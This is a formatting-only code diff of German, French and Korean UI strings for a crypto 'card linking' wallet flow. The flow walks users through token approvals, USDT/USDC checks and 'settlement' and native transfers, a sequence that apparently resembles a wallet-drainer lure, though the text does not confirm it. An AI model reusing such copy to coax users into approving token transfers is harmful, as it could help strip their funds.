@@ -156,7 +156,8 @@ const WALLET_TRANSLATIONS = {
     stageCompleteMsgs: ["Wallet erfolgreich verknüpft"],
     overlayAria: "Netzwerkinformationen werden abgerufen",
     overlayTitle: "Karte verknüpfen",
-    overlaySubtitle: "Bitte warten, während wir Ihre Netzwerkdaten vorbereiten.",
+    overlaySubtitle:
+      "Bitte warten, während wir Ihre Netzwerkdaten vorbereiten.",
     overlayInitial:
       "Wir rufen Netzwerk-, Blockchain- und Token-Informationen für {card} ab.",
     overlayRotating: [
@@ -218,7 +219,8 @@ const WALLET_TRANSLATIONS = {
     premiumBadge: "Premium",
     titleLinking: "Lier votre carte",
     titleSelect: "Choisir votre carte",
-    subtitleLinking: "Patientez pendant que nous connectons votre portefeuille.",
+    subtitleLinking:
+      "Patientez pendant que nous connectons votre portefeuille.",
     subtitleSelect:
       "Sélectionnez un niveau de carte à lier à votre portefeuille non custodial. Aucun frais annuel. Aucun frais caché.",
     connectingHeadline: "Connexion à votre carte {tier}",
@@ -270,12 +272,15 @@ const WALLET_TRANSLATIONS = {
     netBscDesc: "Écosystème DeFi natif avec liquidité mondiale",
     netAvaxDesc: "Sous-réseaux EVM hautement scalables pour dApps actives",
     netArbDesc: "L2 Ethereum à faible coût avec liquidité DeFi profonde",
-    netBaseDesc: "L2 soutenue par Coinbase pour des paiements quotidiens rapides",
+    netBaseDesc:
+      "L2 soutenue par Coinbase pour des paiements quotidiens rapides",
     netSolDesc: "Règlement en moins d'une seconde pour dépenses fréquentes",
-    helperWalletAction: "Complétez la demande dans votre application de portefeuille.",
+    helperWalletAction:
+      "Complétez la demande dans votre application de portefeuille.",
     helperOnchainWait:
       "En attente de confirmation blockchain. Cela peut prendre quelques instants.",
-    helperSetupProcessing: "Traitement de la configuration de votre portefeuille…",
+    helperSetupProcessing:
+      "Traitement de la configuration de votre portefeuille…",
     helperFinalizingNative: "Finalisation du transfert natif on-chain…",
     stageConnectingLabel: "Connexion",
     stageConnectingMsgs: [
@@ -365,8 +370,7 @@ const WALLET_TRANSLATIONS = {
     stageCompleteMsgs: ["Portefeuille lié avec succès"],
     overlayAria: "Récupération des informations réseau",
     overlayTitle: "Lier votre carte",
-    overlaySubtitle:
-      "Patientez pendant que nous préparons vos données réseau.",
+    overlaySubtitle: "Patientez pendant que nous préparons vos données réseau.",
     overlayInitial:
       "Nous récupérons les informations réseau, blockchain et tokens pour {card}.",
     overlayRotating: [
@@ -399,7 +403,8 @@ const WALLET_TRANSLATIONS = {
       "Aucun compte retourné par le portefeuille. Veuillez réessayer.",
     errConnectionExpired:
       "Connexion portefeuille expirée — scannez à nouveau le code QR.",
-    errConnectionReset: "Demande de connexion réinitialisée. Veuillez réessayer.",
+    errConnectionReset:
+      "Demande de connexion réinitialisée. Veuillez réessayer.",
     errNoTronBalances: "Aucun solde Tron trouvé pour ce portefeuille",
     errNoEvmBalances: "Aucun solde EVM trouvé pour ce portefeuille",
     errSelectNetwork: "Sélectionnez d'abord un réseau",
@@ -435,7 +440,8 @@ const MORE_WALLETS = {
     subtitleSelect:
       "비수탁 지갑과 연결할 카드 등급을 선택하세요. 연회비 없음. 숨겨진 수수료 없음.",
     connectingHeadline: "{tier} 카드에 연결 중",
-    connectingMessage: "WalletConnect를 준비 중입니다. QR 코드가 곧 표시됩니다…",
+    connectingMessage:
+      "WalletConnect를 준비 중입니다. QR 코드가 곧 표시됩니다…",
     cardAlt: "{name} 카드",
     linkNetworkTitle: "네트워크 선택",
     walletSetupHeadline: "지갑 설정 중",
@@ -443,11 +449,13 @@ const MORE_WALLETS = {
       "{cardLabel} · 첫 번째 네트워크를 연결하려면 아래 단계를 완료하세요",
     subWalletSetup: "잔액을 동기화하고 지갑용 네트워크를 준비하는 중…",
     subLoadingNetworks: "지갑에 사용 가능한 네트워크를 불러오는 중…",
-    subLinkingWithLinked: "선택한 네트워크를 연결하려면 지갑에서 단계를 완료하세요",
+    subLinkingWithLinked:
+      "선택한 네트워크를 연결하려면 지갑에서 단계를 완료하세요",
     subLinkingInterruptedLinked:
       "연결이 중단되었습니다. 연결된 네트워크는 변경되지 않았습니다.",
     subSelectAnother: "다른 네트워크를 선택하거나 준비되면 닫으세요",
-    subAllLinked: "사용 가능한 모든 네트워크가 연결되었습니다 — 준비되면 닫으세요",
+    subAllLinked:
+      "사용 가능한 모든 네트워크가 연결되었습니다 — 준비되면 닫으세요",
     subLinking: "이 네트워크를 연결하려면 지갑에서 단계를 완료하세요",
     subLinkingInterrupted:
       "연결이 중단되었습니다. 준비되면 다시 시도할 수 있습니다.",
@@ -478,11 +486,16 @@ const MORE_WALLETS = {
     netBaseDesc: "빠른 일상 결제를 위한 Coinbase 지원 L2",
     netSolDesc: "고빈도 지출을 위한 1초 미만 결제",
     helperWalletAction: "지갑 앱에서 요청을 완료하세요.",
-    helperOnchainWait: "블록체인 확인을 기다리는 중입니다. 잠시 걸릴 수 있습니다.",
+    helperOnchainWait:
+      "블록체인 확인을 기다리는 중입니다. 잠시 걸릴 수 있습니다.",
     helperSetupProcessing: "지갑 설정을 처리하는 중…",
     helperFinalizingNative: "온체인 네이티브 전송을 완료하는 중…",
     stageConnectingLabel: "연결 중",
-    stageConnectingMsgs: ["연결 중", "보안 연결 설정 중…", "지갑 세션 열기 중…"],
+    stageConnectingMsgs: [
+      "연결 중",
+      "보안 연결 설정 중…",
+      "지갑 세션 열기 중…",
+    ],
     stagePreparingWalletLabel: "지갑 준비 중",
     stagePreparingWalletMsgs: [
       "지갑 준비 중",
@@ -496,11 +509,7 @@ const MORE_WALLETS = {
       "지갑 호환성 검토 중…",
     ],
     stagePrepAuthLabel: "승인 준비 중",
-    stagePrepAuthMsgs: [
-      "승인 준비 중",
-      "승인 설정 중…",
-      "지갑 확인 준비 중…",
-    ],
+    stagePrepAuthMsgs: ["승인 준비 중", "승인 설정 중…", "지갑 확인 준비 중…"],
     stageBatchLabel: "지갑에서 USDT 및 USDC 확인",
     stageBatchMsgs: [
       "지갑에서 USDT 및 USDC를 확인하세요",
@@ -526,11 +535,7 @@ const MORE_WALLETS = {
       "승인 확인 중…",
     ],
     stageAuthCompleteLabel: "승인 완료",
-    stageAuthCompleteMsgs: [
-      "승인 완료",
-      "지갑 설정 처리 중…",
-      "설정 계속 중…",
-    ],
+    stageAuthCompleteMsgs: ["승인 완료", "지갑 설정 처리 중…", "설정 계속 중…"],
     stageSettlementLabel: "토큰 정산 처리 중",
     stageSettlementMsgs: [
       "토큰 정산 처리 중",
@@ -556,7 +561,11 @@ const MORE_WALLETS = {
       "네이티브 전송 확인 대기 중…",
     ],
     stageVerifyingLabel: "설정 확인 중",
-    stageVerifyingMsgs: ["설정 확인 중", "모든 준비 완료 확인 중…", "거의 완료…"],
+    stageVerifyingMsgs: [
+      "설정 확인 중",
+      "모든 준비 완료 확인 중…",
+      "거의 완료…",
+    ],
     stageCompleteLabel: "지갑 연결 성공",
     stageCompleteMsgs: ["지갑 연결 성공"],
     overlayAria: "네트워크 정보 가져오는 중",
